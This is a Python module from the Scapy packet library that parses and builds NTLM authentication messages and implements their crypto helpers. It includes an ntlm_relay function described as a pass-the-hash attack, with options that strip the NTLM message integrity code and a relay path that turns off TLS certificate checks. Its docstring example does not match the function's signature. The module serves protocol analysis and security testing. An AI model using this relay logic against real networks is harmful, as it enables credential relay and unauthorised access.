# SPDX-License-Identifier: GPL-2.0-only
# This file is part of Scapy
# See https://scapy.net/ for more information
# Copyright (C) Philippe Biondi <gabriel[]potter[]fr>

"""
NTLM

https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-NLMP/%5bMS-NLMP%5d.pdf
"""

import ssl
import socket
import struct
import threading

from scapy.arch import get_if_addr
from scapy.asn1.asn1 import ASN1_STRING, ASN1_Codecs
from scapy.asn1.mib import conf  # loads conf.mib
from scapy.asn1fields import (
    ASN1F_OID,
    ASN1F_PRINTABLE_STRING,
    ASN1F_SEQUENCE,
    ASN1F_SEQUENCE_OF
)
from scapy.asn1packet import ASN1_Packet
from scapy.automaton import Automaton, ObjectPipe
from scapy.compat import bytes_base64
from scapy.fields import (
    Field,
    ByteEnumField,
    ByteField,
    ConditionalField,
    FieldLenField,
    FlagsField,
    LEIntField,
    _StrField,
    LEShortEnumField,
    MultipleTypeField,
    PacketField,
    PacketListField,
    LEShortField,
    StrField,
    StrFieldUtf16,
    StrFixedLenField,
    LEIntEnumField,
    LEThreeBytesField,
    StrLenFieldUtf16,
    UTCTimeField,
    XStrField,
    XStrFixedLenField,
    XStrLenField,
)
from scapy.packet import Packet
from scapy.sessions import StringBuffer
from scapy.supersocket import SSLStreamSocket, StreamSocket

from scapy.compat import (
    Any,
    Callable,
    Dict,
    List,
    Tuple,
    Optional,
)

# Crypto imports

from scapy.layers.tls.crypto.hash import Hash_MD4

if conf.crypto_valid:
    from cryptography.hazmat.primitives import hashes, hmac
else:
    hashes = hmac = None

##########
# Fields #
##########


class _NTLMPayloadField(_StrField[List[Tuple[str, Any]]]):
    """Special field used to dissect NTLM payloads.
    This isn't trivial because the offsets are variable."""
    __slots__ = ["fields", "fields_map", "offset", "length_from"]
    islist = True

    def __init__(self,
                 name,  # type: str
                 offset,  # type: int
                 fields,  # type: List[Field[Any, Any]]
                 length_from=None  # type: Optional[Callable[[Packet], int]]
                 ):
        # type: (...) -> None
        self.offset = offset
        self.fields = fields
        self.fields_map = {field.name: field for field in fields}
        self.length_from = length_from
        super(_NTLMPayloadField, self).__init__(
            name,
            [(field.name, field.default) for field in fields
             if field.default is not None]
        )

    def m2i(self, pkt, x):
        # type: (Optional[Packet], bytes) -> List[Tuple[str, str]]
        if not pkt or not x:
            return []
        results = []
        for field in self.fields:
            offset = pkt.getfieldval(field.name + "BufferOffset") - self.offset
            try:
                length = pkt.getfieldval(field.name + "Len")
            except AttributeError:
                length = len(x) - offset
            if offset < 0:
                continue
            if x[offset:offset + length]:
                results.append((offset, field.name, field.getfield(
                    pkt, x[offset:offset + length])[1]))
        results.sort(key=lambda x: x[0])
        return [x[1:] for x in results]

    def i2m(self, pkt, x):
        # type: (Optional[Packet], Optional[List[Tuple[str, str]]]) -> bytes
        buf = StringBuffer()
        for field_name, value in x:
            if field_name not in self.fields_map:
                continue
            field = self.fields_map[field_name]
            offset = pkt.getfieldval(field_name + "BufferOffset")
            if offset is not None:
                offset -= self.offset
            else:
                offset = len(buf)
            buf.append(field.addfield(pkt, b"", value), offset + 1)
        return bytes(buf)

    def _on_payload(self, pkt, x, func):
        # type: (Optional[Packet], bytes, str) -> List[Tuple[str, Any]]
        if not pkt or not x:
            return []
        results = []
        for field_name, value in x:
            if field_name not in self.fields_map:
                continue
            if not isinstance(self.fields_map[field_name], PacketListField) \
                    and not isinstance(value, Packet):
                value = getattr(self.fields_map[field_name], func)(pkt, value)
            results.append((
                field_name,
                value
            ))
        return results

    def i2h(self, pkt, x):
        # type: (Optional[Packet], bytes) -> List[Tuple[str, str]]
        return self._on_payload(pkt, x, "i2h")

    def h2i(self, pkt, x):
        # type: (Optional[Packet], bytes) -> List[Tuple[str, str]]
        return self._on_payload(pkt, x, "h2i")

    def i2repr(self, pkt, x):
        # type: (Optional[Packet], bytes) -> str
        return repr(self._on_payload(pkt, x, "i2repr"))

    def getfield(self, pkt, s):
        # type: (Packet, bytes) -> Tuple[bytes, bytes]
        if self.length_from is None:
            return b"", self.m2i(pkt, s)
        len_pkt = self.length_from(pkt)
        return s[len_pkt:], self.m2i(pkt, s[:len_pkt])


class _NTLMPayloadPacket(Packet):
    _NTLM_PAYLOAD_FIELD_NAME = "Payload"

    def __getattr__(self, attr):
        # Ease compatibility with _NTLMPayloadField
        try:
            return super(_NTLMPayloadPacket, self).__getattr__(attr)
        except AttributeError:
            try:
                return next(
                    x[1]
                    for x in super(_NTLMPayloadPacket, self).__getattr__(
                        self._NTLM_PAYLOAD_FIELD_NAME
                    )
                    if x[0] == attr
                )
            except StopIteration:
                raise AttributeError(attr)

    def setfieldval(self, attr, val):
        # Ease compatibility with _NTLMPayloadField
        try:
            return super(_NTLMPayloadPacket, self).setfieldval(attr, val)
        except AttributeError:
            Payload = super(_NTLMPayloadPacket, self).__getattr__(
                self.self._NTLM_PAYLOAD_FIELD_NAME
            )
            Payload.pop(next(
                i
                for i, x in enumerate(
                    super(_NTLMPayloadPacket, self).__getattr__(
                        self.self._NTLM_PAYLOAD_FIELD_NAME
                    ))
                if x[0] == attr
            ))
            Payload.append([attr, val])
            super(_NTLMPayloadPacket, self).setfieldval(
                self.self._NTLM_PAYLOAD_FIELD_NAME,
                Payload
            )


def _NTLM_post_build(self, p, pay_offset, fields):
    # type: (Packet, bytes, int, Dict[str, Tuple[str, int]]) -> bytes
    """Util function to build the offset and populate the lengths"""
    for field_name, value in self.fields["Payload"]:
        length = self.get_field(
            "Payload").fields_map[field_name].i2len(self, value)
        offset = fields[field_name]
        # Length
        if self.getfieldval(field_name + "Len") is None:
            p = p[:offset] + \
                struct.pack("<H", length) + p[offset + 2:]
        # MaxLength
        if self.getfieldval(field_name + "MaxLen") is None:
            p = p[:offset + 2] + \
                struct.pack("<H", length) + p[offset + 4:]
        # Offset
        if self.getfieldval(field_name + "BufferOffset") is None:
            p = p[:offset + 4] + \
                struct.pack("<I", pay_offset) + p[offset + 8:]
        pay_offset += length
    return p


##############
# Structures #
##############


# Sect 2.2


class NTLM_Header(Packet):
    name = "NTLM Header"
    fields_desc = [
        StrFixedLenField('Signature', b'NTLMSSP\0', length=8),
        LEIntEnumField('MessageType', 3, {1: 'NEGOTIATE_MESSAGE',
                                          2: 'CHALLENGE_MESSAGE',
                                          3: 'AUTHENTICATE_MESSAGE'}),
    ]

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if _pkt and len(_pkt) >= 10:
            MessageType = struct.unpack("<H", _pkt[8:10])[0]
            if MessageType == 1:
                return NTLM_NEGOTIATE
            elif MessageType == 2:
                return NTLM_CHALLENGE
            elif MessageType == 3:
                return NTLM_AUTHENTICATE_V2
        return cls


# Sect 2.2.2.5
_negotiateFlags = [
    "NTLMSSP_NEGOTIATE_UNICODE",  # A
    "NTLM_NEGOTIATE_OEM",  # B
    "NTLMSSP_REQUEST_TARGET",  # C
    "r10",
    "NTLMSSP_NEGOTIATE_SIGN",  # D
    "NTLMSSP_NEGOTIATE_SEAL",  # E
    "NTLMSSP_NEGOTIATE_DATAGRAM",  # F
    "NTLMSSP_NEGOTIATE_LM_KEY",  # G
    "r9",
    "NTLMSSP_NEGOTIATE_NTLM",  # H
    "r8",
    "J",
    "NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED",  # K
    "NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED",  # L
    "r7",
    "NTLMSSP_NEGOTIATE_ALWAYS_SIGN",  # M
    "NTLMSSP_TARGET_TYPE_DOMAIN",  # N
    "NTLMSSP_TARGET_TYPE_SERVER",  # O
    "r6",
    "NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY",  # P
    "NTLMSSP_NEGOTIATE_IDENTIFY",  # Q
    "r5",
    "NTLMSSP_REQUEST_NON_NT_SESSION_KEY",  # R
    "NTLMSSP_NEGOTIATE_TARGET_INFO",  # S
    "r4",
    "NTLMSSP_NEGOTIATE_VERSION",  # T
    "r3",
    "r2",
    "r1",
    "NTLMSSP_NEGOTIATE_128",  # U
    "NTLMSSP_NEGOTIATE_KEY_EXCH",  # V
    "NTLMSSP_NEGOTIATE_56",  # W
]


def _NTLMStrField(name, default):
    return MultipleTypeField(
        [
            (StrFieldUtf16(name, default),
             lambda pkt: pkt.NegotiateFlags.NTLMSSP_NEGOTIATE_UNICODE)
        ],
        StrField(name, default),
    )

# Sect 2.2.2.10


class _NTLM_Version(Packet):
    fields_desc = [
        ByteField('ProductMajorVersion', 0),
        ByteField('ProductMinorVersion', 0),
        LEShortField('ProductBuild', 0),
        LEThreeBytesField('res_ver', 0),
        ByteEnumField('NTLMRevisionCurrent', 0x0F, {0x0F: "v15"}),
    ]

# Sect 2.2.1.1


class NTLM_NEGOTIATE(_NTLMPayloadPacket):
    name = "NTLM Negotiate"
    messageType = 1
    OFFSET = 40
    fields_desc = [
        NTLM_Header,
        FlagsField('NegotiateFlags', 0, -32, _negotiateFlags),
        # DomainNameFields
        LEShortField('DomainNameLen', None),
        LEShortField('DomainNameMaxLen', None),
        LEIntField('DomainNameBufferOffset', None),
        # WorkstationFields
        LEShortField('WorkstationNameLen', None),
        LEShortField('WorkstationNameMaxLen', None),
        LEIntField('WorkstationNameBufferOffset', None),
        # VERSION
        _NTLM_Version,
        # Payload
        _NTLMPayloadField(
            'Payload', OFFSET, [
                _NTLMStrField('DomainName', b''),
                _NTLMStrField('WorkstationName', b'')
            ])
    ]

    def post_build(self, pkt, pay):
        # type: (bytes, bytes) -> bytes
        return _NTLM_post_build(self, pkt, self.OFFSET, {
            "DomainName": 16,
            "WorkstationName": 24,
        }) + pay

# Challenge


class Single_Host_Data(Packet):
    fields_desc = [
        LEIntField("Size", 0),
        LEIntField("Z4", 0),
        XStrFixedLenField("CustomData", b"", length=8),
        XStrFixedLenField("MachineID", b"", length=32),
    ]

    def default_payload_class(self, payload):
        return conf.padding_layer


class AV_PAIR(Packet):
    name = "NTLM AV Pair"
    fields_desc = [
        LEShortEnumField('AvId', 0, {
            0x0000: "MsvAvEOL",
            0x0001: "MsvAvNbComputerName",
            0x0002: "MsvAvNbDomainName",
            0x0003: "MsvAvDnsComputerName",
            0x0004: "MsvAvDnsDomainName",
            0x0005: "MsvAvDnsTreeName",
            0x0006: "MsvAvFlags",
            0x0007: "MsvAvTimestamp",
            0x0008: "MsvAvSingleHost",
            0x0009: "MsvAvTargetName",
            0x000A: "MsvAvChannelBindings",
        }),
        FieldLenField('AvLen', None, length_of="Value", fmt="<H"),
        MultipleTypeField([
            (LEIntEnumField('Value', 1, {
                0x0001: "constrained",
                0x0002: "MIC integrity",
                0x0004: "SPN from untrusted source"}),
             lambda pkt: pkt.AvId == 0x0006),
            (UTCTimeField("Value", None, epoch=[
                1601, 1, 1, 0, 0, 0], custom_scaling=1e7,
                fmt="<Q"),
                lambda pkt: pkt.AvId == 0x0007),
            (PacketField('Value', Single_Host_Data(), Single_Host_Data),
             lambda pkt: pkt.AvId == 0x0008),
            (XStrLenField('Value', b"", length_from=lambda pkt: pkt.AvLen),
             lambda pkt: pkt.AvId == 0x000A),
        ],
            StrLenFieldUtf16('Value', b"", length_from=lambda pkt: pkt.AvLen)
        )
    ]

    def default_payload_class(self, payload):
        return conf.padding_layer


class NTLM_CHALLENGE(_NTLMPayloadPacket):
    name = "NTLM Challenge"
    messageType = 2
    OFFSET = 56
    fields_desc = [
        NTLM_Header,
        # TargetNameFields
        LEShortField('TargetNameLen', None),
        LEShortField('TargetNameMaxLen', None),
        LEIntField('TargetNameBufferOffset', None),
        #
        FlagsField('NegotiateFlags', 0, -32, _negotiateFlags),
        XStrFixedLenField('ServerChallenge', None, length=8),
        XStrFixedLenField('Reserved', None, length=8),
        # TargetInfoFields
        LEShortField('TargetInfoLen', None),
        LEShortField('TargetInfoMaxLen', None),
        LEIntField('TargetInfoBufferOffset', None),
        # VERSION
        _NTLM_Version,
        # Payload
        _NTLMPayloadField(
            'Payload', OFFSET, [
                _NTLMStrField('TargetName', b''),
                PacketListField('TargetInfo', [AV_PAIR()], AV_PAIR)
            ])
    ]

    def post_build(self, pkt, pay):
        # type: (bytes, bytes) -> bytes
        return _NTLM_post_build(self, pkt, self.OFFSET, {
            "TargetName": 12,
            "TargetInfo": 40,
        }) + pay


# Authenticate

class LM_RESPONSE(Packet):
    fields_desc = [
        StrFixedLenField("Response", b"", length=24),
    ]


class LMv2_RESPONSE(Packet):
    fields_desc = [
        StrFixedLenField("Response", b"", length=16),
        StrFixedLenField("ChallengeFromClient", b"", length=8),
    ]


class NTLM_RESPONSE(Packet):
    fields_desc = [
        StrFixedLenField("Response", b"", length=24),
    ]


class NTLMv2_CLIENT_CHALLENGE(Packet):
    fields_desc = [
        ByteField("RespType", 0),
        ByteField("HiRespType", 0),
        LEShortField("Reserved1", 0),
        LEIntField("Reserved2", 0),
        UTCTimeField("TimeStamp", None, fmt="<Q", epoch=[
                     1601, 1, 1, 0, 0, 0], custom_scaling=1e7),
        StrFixedLenField("ChallengeFromClient", b"", length=8),
        LEIntField("Reserved3", 0),
        PacketListField("AvPairs", [AV_PAIR()], AV_PAIR)
    ]


class NTLMv2_RESPONSE(Packet):
    fields_desc = [
        XStrFixedLenField("NTProofStr", b"", length=16),
        NTLMv2_CLIENT_CHALLENGE
    ]


class NTLM_AUTHENTICATE(_NTLMPayloadPacket):
    name = "NTLM Authenticate"
    messageType = 3
    OFFSET = 88
    NTLM_VERSION = 1
    fields_desc = [
        NTLM_Header,
        # LmChallengeResponseFields
        LEShortField('LmChallengeResponseLen', None),
        LEShortField('LmChallengeResponseMaxLen', None),
        LEIntField('LmChallengeResponseBufferOffset', None),
        # NtChallengeResponseFields
        LEShortField('NtChallengeResponseLen', None),
        LEShortField('NtChallengeResponseMaxLen', None),
        LEIntField('NtChallengeResponseBufferOffset', None),
        # DomainNameFields
        LEShortField('DomainNameLen', None),
        LEShortField('DomainNameMaxLen', None),
        LEIntField('DomainNameBufferOffset', None),
        # UserNameFields
        LEShortField('UserNameLen', None),
        LEShortField('UserNameMaxLen', None),
        LEIntField('UserNameBufferOffset', None),
        # WorkstationFields
        LEShortField('WorkstationLen', None),
        LEShortField('WorkstationMaxLen', None),
        LEIntField('WorkstationBufferOffset', None),
        # EncryptedRandomSessionKeyFields
        LEShortField('EncryptedRandomSessionKeyLen', None),
        LEShortField('EncryptedRandomSessionKeyMaxLen', None),
        LEIntField('EncryptedRandomSessionKeyBufferOffset', None),
        # NegotiateFlags
        FlagsField('NegotiateFlags', 0, -32, _negotiateFlags),
        # VERSION
        _NTLM_Version,
        # MIC
        ConditionalField(
            XStrFixedLenField('MIC', b"", length=16),
            lambda pkt: pkt.fields.get('MIC', b"") is not None
        ),
        # Payload
        _NTLMPayloadField(
            'Payload', OFFSET, [
                MultipleTypeField(
                    [(PacketField('LmChallengeResponse', LMv2_RESPONSE(),
                      LMv2_RESPONSE), lambda pkt: pkt.NTLM_VERSION == 2)],
                    PacketField('LmChallengeResponse',
                                LM_RESPONSE(), LM_RESPONSE)
                ),
                MultipleTypeField(
                    [(PacketField('NtChallengeResponse', NTLMv2_RESPONSE(),
                      NTLMv2_RESPONSE), lambda pkt: pkt.NTLM_VERSION == 2)],
                    PacketField('NtChallengeResponse',
                                NTLM_RESPONSE(), NTLM_RESPONSE)
                ),
                _NTLMStrField('DomainName', b''),
                _NTLMStrField('UserName', b''),
                _NTLMStrField('Workstation', b''),
                XStrField('EncryptedRandomSessionKey', b''),
            ])
    ]

    def post_build(self, pkt, pay):
        # type: (bytes, bytes) -> bytes
        return _NTLM_post_build(self, pkt, self.OFFSET, {
            "LmChallengeResponse": 12,
            "NtChallengeResponse": 20,
            "DomainName": 28,
            "UserName": 36,
            "Workstation": 44,
            "EncryptedRandomSessionKey": 52
        }) + pay


class NTLM_AUTHENTICATE_V2(NTLM_AUTHENTICATE):
    NTLM_VERSION = 2


def HTTP_ntlm_negotiate(ntlm_negotiate):
    """Create an HTTP NTLM negotiate packet from an NTLM_NEGOTIATE message"""
    assert isinstance(ntlm_negotiate, NTLM_NEGOTIATE)
    from scapy.layers.http import HTTP, HTTPRequest
    return HTTP() / HTTPRequest(
        Authorization=b"NTLM " + bytes_base64(bytes(ntlm_negotiate))
    )

# Answering machine


class _NTLM_Automaton(Automaton):
    def __init__(self, sock, **kwargs):
        # type: (StreamSocket, Any) -> None
        self.token_pipe = ObjectPipe()
        self.values = {}
        for key, dflt in [("DROP_MIC_v1", False), ("DROP_MIC_v2", False)]:
            setattr(self, key, kwargs.pop(key, dflt))
        self.DROP_MIC = self.DROP_MIC_v1 or self.DROP_MIC_v2
        super(_NTLM_Automaton, self).__init__(
            recvsock=lambda **kwargs: sock,
            ll=lambda **kwargs: sock,
            **kwargs
        )

    def _get_token(self, token):
        if not token:
            return None, None, None, None

        from scapy.layers.gssapi import (
            GSSAPI_BLOB,
            SPNEGO_negToken,
            SPNEGO_Token
        )

        negResult = None
        MIC = None
        rawToken = False

        if isinstance(token, bytes):
            # SMB 1 - non extended
            return (token, None, None, True)
        if isinstance(token, (NTLM_NEGOTIATE,
                              NTLM_CHALLENGE,
                              NTLM_AUTHENTICATE,
                              NTLM_AUTHENTICATE_V2)):
            ntlm = token
            rawToken = True
        if isinstance(token, GSSAPI_BLOB):
            token = token.innerContextToken
        if isinstance(token, SPNEGO_negToken):
            token = token.token
        if hasattr(token, "mechListMIC") and token.mechListMIC:
            MIC = token.mechListMIC.value
        if hasattr(token, "negResult"):
            negResult = token.negResult
        try:
            ntlm = token.mechToken
        except AttributeError:
            ntlm = token.responseToken
        if isinstance(ntlm, SPNEGO_Token):
            ntlm = ntlm.value
        if isinstance(ntlm, ASN1_STRING):
            ntlm = NTLM_Header(ntlm.val)
        if isinstance(ntlm, conf.raw_layer):
            ntlm = NTLM_Header(ntlm.load)
        if self.DROP_MIC_v1 or self.DROP_MIC_v2:
            if isinstance(ntlm, NTLM_AUTHENTICATE):
                ntlm.MIC = b"\0" * 16
                ntlm.NtChallengeResponseLen = None
                ntlm.NtChallengeResponseMaxLen = None
                ntlm.EncryptedRandomSessionKeyBufferOffset = None
                if self.DROP_MIC_v2:
                    ChallengeResponse = next(
                        v[1] for v in ntlm.Payload
                        if v[0] == 'NtChallengeResponse'
                    )
                    i = next(
                        i for i, k in enumerate(ChallengeResponse.AvPairs)
                        if k.AvId == 0x0006
                    )
                    ChallengeResponse.AvPairs.insert(
                        i + 1,
                        AV_PAIR(AvId="MsvAvFlags", Value=0)
                    )
        return ntlm, negResult, MIC, rawToken

    def received_ntlm_token(self, ntlm):
        self.token_pipe.send(ntlm)

    def get(self, attr, default=None):
        if default is not None:
            return self.values.get(attr, default)
        return self.values[attr]

    def end(self):
        self.listen_sock.close()
        self.stop()


class NTLM_Client(_NTLM_Automaton):
    """
    A class to overload to create a client automaton when using
    NTLM.
    """
    port = 445
    cls = conf.raw_layer
    ssl = False
    kwargs_cls = {}

    def __init__(self, *args, **kwargs):
        self.client_pipe = ObjectPipe()
        super(NTLM_Client, self).__init__(*args, **kwargs)

    def bind(self, srv_atmt):
        # type: (NTLM_Server) -> None
        self.srv_atmt = srv_atmt

    def set_srv(self, attr, value):
        self.srv_atmt.values[attr] = value

    def get_token(self):
        return self.srv_atmt.token_pipe.recv()

    def echo(self, pkt):
        return self.srv_atmt.send(pkt)

    def wait_server(self):
        kwargs = self.client_pipe.recv()
        self.client_pipe.close()
        return kwargs


class NTLM_Server(_NTLM_Automaton):
    """
    A class to overload to create a server automaton when using
    NTLM.
    """
    port = 445
    cls = conf.raw_layer

    def __init__(self, *args, **kwargs):
        self.cli_atmt = None
        self.cli_values = dict()
        self.ntlm_values = kwargs.pop("NTLM_VALUES", dict())
        self.ntlm_state = 0
        self.IDENTITIES = kwargs.pop("IDENTITIES", None)
        self.SigningSessionKey = None
        super(NTLM_Server, self).__init__(*args, **kwargs)

    def bind(self, cli_atmt):
        # type: (NTLM_Client) -> None
        self.cli_atmt = cli_atmt

    def get_token(self):
        from random import randint
        if self.cli_atmt:
            return self.cli_atmt.token_pipe.recv()
        elif self.ntlm_state == 0:
            self.ntlm_state = 1
            return NTLM_CHALLENGE(
                ServerChallenge=self.ntlm_values.get(
                    "ServerChallenge", struct.pack("<Q", randint(0, 2**64))),
                MessageType=2,
                NegotiateFlags=self.ntlm_values.get(
                    "NegotiateFlags", 0xe2898215),
                ProductMajorVersion=self.ntlm_values.get(
                    "ProductMajorVersion", 10),
                ProductMinorVersion=self.ntlm_values.get(
                    "ProductMinorVersion", 0),
                Payload=[
                    ('TargetName', self.ntlm_values.get("TargetName", "")),
                    ('TargetInfo', [
                        # MsvAvNbComputerName
                        AV_PAIR(AvId=1, Value=self.ntlm_values.get(
                                "NetbiosComputerName", "")),
                        #  "T1-SRV-DHCP"),
                        # MsvAvNbDomainName
                        AV_PAIR(AvId=2, Value=self.ntlm_values.get(
                                "NetbiosDomainName", "")),
                        #  "TESTDOMAIN"),
                        # MsvAvDnsComputerName
                        AV_PAIR(AvId=3, Value=self.ntlm_values.get(
                                "DnsComputerName", "")),
                        # "T1-SRV-DHCP.TESTDOMAIN.local"),
                        # MsvAvDnsDomainName
                        AV_PAIR(AvId=4, Value=self.ntlm_values.get(
                                "DnsDomainName", "")),
                        # TESTDOMAIN.local"),
                        # MsvAvDnsTreeName
                        AV_PAIR(AvId=5, Value=self.ntlm_values.get(
                                "DnsTreeName", "")),
                        # TESTDOMAIN.local"),
                        # MsvAvTimestamp
                        AV_PAIR(AvId=7, Value=self.ntlm_values.get(
                                "Timestamp", 0.0)),
                        # MsvAvEOL
                        AV_PAIR(AvId=0),
                    ]),
                ]
            ), None, None, False
        elif self.ntlm_state == 1:
            self.ntlm_state = 0
            return None, 0, None, False

    def received_ntlm_token(self, ntlm_tuple):
        ntlm = ntlm_tuple[0]
        if isinstance(ntlm, NTLM_AUTHENTICATE_V2) and self.IDENTITIES:
            username = ntlm.UserName
            if username in self.IDENTITIES:
                SessionBaseKey = NTLMv2_ComputeSessionBaseKey(
                    self.IDENTITIES[username],
                    ntlm.NtChallengeResponse.NTProofStr
                )
                # [MS-NLMP] sect 3.2.5.1.2
                KeyExchangeKey = SessionBaseKey  # Only true for NTLMv2
                if ntlm.NegotiateFlags.NTLMSSP_NEGOTIATE_KEY_EXCH:
                    ExportedSessionKey = RC4K(
                        KeyExchangeKey,
                        ntlm.EncryptedRandomSessionKey
                    )
                else:
                    ExportedSessionKey = KeyExchangeKey
                self.SigningSessionKey = ExportedSessionKey  # For SMB
        super(NTLM_Server, self).received_ntlm_token(ntlm_tuple)

    def set_cli(self, attr, value):
        if self.cli_atmt:
            self.cli_atmt.values[attr] = value
        else:
            self.cli_values[attr] = value

    def echo(self, pkt):
        if self.cli_atmt:
            return self.cli_atmt.send(pkt)

    def start_client(self, **kwargs):
        assert(self.cli_atmt), "Cannot start NTLM client: not provided"
        self.cli_atmt.client_pipe.send(kwargs)


def ntlm_relay(serverCls,
               remoteIP,
               remoteClientCls,
               # Classic attacks
               DROP_MIC_v1=False,
               DROP_MIC_v2=False,
               DROP_EXTENDED_SECURITY=False,  # SMB1
               # Optional arguments
               ALLOW_SMB2=None,
               server_kwargs=None,
               client_kwargs=None,
               iface=None):
    """
    NTLM Relay

    This class aims at implementing a simple pass-the-hash attack across
    various protocols.

    Usage example:
        ntlm_relay(port=445,
                   remoteIP="192.168.122.65",
                   remotePort=445,
                   iface="eth0")

    :param port: the port to open the relay on
    :param remoteIP: the address IP of the server to connect to for auth
    :param remotePort: the proto to connect to the server into
    """

    assert issubclass(
        serverCls, NTLM_Server), "Specify a correct NTLM server class"
    assert issubclass(
        remoteClientCls, NTLM_Client), "Specify a correct NTLM client class"
    assert remoteIP, "Specify a valid remote IP address"

    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssock.bind(
        (get_if_addr(iface or conf.iface), serverCls.port))
    ssock.listen(5)
    sniffers = []
    server_kwargs = server_kwargs or {}
    client_kwargs = client_kwargs or {}
    if DROP_MIC_v1:
        server_kwargs["DROP_MIC_v1"] = client_kwargs["DROP_MIC_v1"] = True
    if DROP_MIC_v2:
        server_kwargs["DROP_MIC_v2"] = client_kwargs["DROP_MIC_v2"] = True
    if DROP_EXTENDED_SECURITY:
        client_kwargs["EXTENDED_SECURITY"] = False
        server_kwargs["EXTENDED_SECURITY"] = False
    if ALLOW_SMB2 is not None:
        client_kwargs["ALLOW_SMB2"] = server_kwargs["ALLOW_SMB2"] = ALLOW_SMB2
    for k, v in remoteClientCls.kwargs_cls.get(serverCls, {}).items():
        if k not in server_kwargs:
            server_kwargs[k] = v
    try:
        evt = threading.Event()
        while not evt.is_set():
            clientsocket, address = ssock.accept()
            sock = StreamSocket(clientsocket, serverCls.cls)
            srv_atmt = serverCls(sock, debug=4, **server_kwargs)
            # Connect to real server
            _sock = socket.socket()
            _sock.connect(
                (remoteIP, remoteClientCls.port)
            )
            remote_sock = None
            # SSL?
            if remoteClientCls.ssl:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                # Disable all SSL checks...
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                _sock = context.wrap_socket(_sock)
                remote_sock = SSLStreamSocket(_sock, remoteClientCls.cls)
            else:
                remote_sock = StreamSocket(_sock, remoteClientCls.cls)
            print("%s connected -> %s" %
                  (repr(address), repr(_sock.getsockname())))
            cli_atmt = remoteClientCls(remote_sock, debug=4, **client_kwargs)
            sock_tup = ((srv_atmt, cli_atmt), (sock, remote_sock))
            sniffers.append(sock_tup)
            # Bind NTLM functions
            srv_atmt.bind(cli_atmt)
            cli_atmt.bind(srv_atmt)
            # Start automatons
            srv_atmt.runbg()
            cli_atmt.runbg()
    except KeyboardInterrupt:
        print("Exiting.")
    finally:
        for atmts, socks in sniffers:
            for atmt in atmts:
                try:
                    atmt.forcestop(wait=False)
                except Exception:
                    pass
            for sock in socks:
                try:
                    sock.close()
                except Exception:
                    pass
        ssock.close()


def ntlm_server(serverCls,
                server_kwargs=None,
                iface=None):
    """
    Starts a standalone NTLM server class
    """
    assert issubclass(
        serverCls, NTLM_Server), "Specify a correct NTLM server class"

    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssock.bind(
        (get_if_addr(iface or conf.iface), serverCls.port))
    ssock.listen(5)
    sniffers = []
    server_kwargs = server_kwargs or {}
    try:
        evt = threading.Event()
        while not evt.is_set():
            clientsocket, address = ssock.accept()
            sock = StreamSocket(clientsocket, serverCls.cls)
            srv_atmt = serverCls(sock, debug=4, **server_kwargs)
            sniffers.append((srv_atmt, sock))
            print("%s connected " % repr(address))
            # Start automatons
            srv_atmt.runbg()
    except KeyboardInterrupt:
        print("Exiting.")
    finally:
        for atmt, sock in sniffers:
            try:
                atmt.forcestop(wait=False)
            except Exception:
                pass
            try:
                sock.close()
            except Exception:
                pass
        ssock.close()


# Experimental - Reversed stuff

# This is the GSSAPI NegoEX Exchange metadata blob. This is not documented
# but described as an "opaque blob": this was reversed and everything is a
# placeholder.

class NEGOEX_EXCHANGE_NTLM_ITEM(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SEQUENCE(
        ASN1F_SEQUENCE(
            ASN1F_SEQUENCE(
                ASN1F_OID("oid", ""),
                ASN1F_PRINTABLE_STRING("token", ""),
                explicit_tag=0x31
            ),
            explicit_tag=0x80
        )
    )


class NEGOEX_EXCHANGE_NTLM(ASN1_Packet):
    """
    GSSAPI NegoEX Exchange metadata blob
    This was reversed and may be meaningless
    """
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SEQUENCE(
        ASN1F_SEQUENCE(
            ASN1F_SEQUENCE_OF(
                "items", [],
                NEGOEX_EXCHANGE_NTLM_ITEM
            ),
            implicit_tag=0xa0
        ),
    )


# Crypto - [MS-NLMP]


def HMAC_MD5(key, data):
    h = hmac.HMAC(key, hashes.MD5())
    h.update(data)
    return h.finalize()


def MD4(x):
    return Hash_MD4().digest(x)


def Z(n):
    return b"\x00" * n


def RC4K(key, data):
    """Alleged RC4"""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    algorithm = algorithms.ARC4(key)
    cipher = Cipher(algorithm, mode=None)
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# sect 3.3.2


def NTOWFv2(Passwd, User, UserDom):
    """Computes the ResponseKeyNT"""
    return HMAC_MD5(MD4(Passwd.encode("utf-16le")),
                    (User.upper() + UserDom).encode("utf-16le"))


def NTLMv2_ComputeSessionBaseKey(ResponseKeyNT, NTProofStr):
    return HMAC_MD5(ResponseKeyNT, NTProofStr)


# def _NTLMv2_ComputeResponse(ResponseKeyNT,
#                             ServerChallenge, ClientChallenge, Time,
#                             ServerName):
#     """
#     Compute the NTLMv2 response : NtChallengeResponse + SessionBaseKey
#
#     Remember ServerName = AvPairs
#     """
#     Responserversion = b"\x01"
#     HiResponserversion = b"\x01"
#     temp = b"".join([Responserversion, HiResponserversion,
#                      Z(6), Time, ClientChallenge, Z(4), ServerName, Z(4)])
#     NTProofStr = HMAC_MD5(ResponseKeyNT, ServerChallenge + temp)
#     NtChallengeResponse = NTProofStr + temp
#     SessionBaseKey = NTLMv2_ComputeSessionBaseKey(ResponseKeyNT, NTProofStr)
#     return NtChallengeResponse, SessionBaseKey
